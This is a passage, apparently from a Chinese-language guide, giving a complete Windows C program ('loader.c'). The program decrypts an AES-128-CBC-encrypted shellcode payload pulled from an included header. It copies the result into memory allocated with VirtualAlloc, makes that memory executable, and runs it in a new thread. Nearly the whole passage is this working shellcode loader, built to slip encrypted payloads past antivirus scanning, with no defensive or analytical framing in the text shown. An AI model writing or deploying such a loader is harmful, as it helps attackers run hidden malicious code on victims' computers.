**2. loader.c（AES-CBC 解密 + 执行）**

```c
#include <windows.h>
#include <wincrypt.h>
#include "payload.h"
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

// 精简 AES-CBC 解密：直接用 CNG / CryptoAPI 里的 AES provider
static BOOL AesDecrypt(BYTE *ct, DWORD ctLen, BYTE *key, BYTE *iv, BYTE **out, DWORD *outLen) {
    HCRYPTPROV hProv = 0; HCRYPTKEY hKey = 0;
    BOOL ok = FALSE;
    if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return FALSE;

    struct { BLOBHEADER hdr; DWORD keySize; BYTE key[16]; } kblob;
    kblob.hdr.bType = PLAINTEXTKEYBLOB;
    kblob.hdr.bVersion = CUR_BLOB_VERSION;
    kblob.hdr.reserved = 0;
    kblob.hdr.aiKeyAlg = CALG_AES_128;
    kblob.keySize = 16;
    memcpy(kblob.key, key, 16);

    if (!CryptImportKey(hProv, (BYTE*)&kblob, sizeof(kblob), 0, 0, &hKey)) goto cleanup;
    // CBC 的 IV 通过 KP_IV 设置
    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) goto cleanup;
    DWORD dwMode = CRYPT_MODE_CBC;
    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwMode, 0);

    *out = (BYTE*)malloc(ctLen);
    memcpy(*out, ct, ctLen);
    DWORD len = ctLen;
    if (!CryptDecrypt(hKey, 0, TRUE, 0, *out, &len)) { free(*out); goto cleanup; }
    *outLen = len;
    ok = TRUE;
cleanup:
    if (hKey) CryptDestroyKey(hKey);
    if (hProv) CryptReleaseContext(hProv, 0);
    return ok;
}

int main(void) {
    BYTE *sc = NULL; DWORD scLen = 0;
    if (!AesDecrypt(g_ct, g_ct_len, g_key, g_iv, &sc, &scLen)) return 1;

    LPVOID mem = VirtualAlloc(NULL, scLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return 1;
    memcpy(mem, sc, scLen);
    DWORD old;
    VirtualProtect(mem, scLen, PAGE_EXECUTE_READ, &old);

    HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (h) WaitForSingleObject(h, INFINITE);
    return 0;
}
```

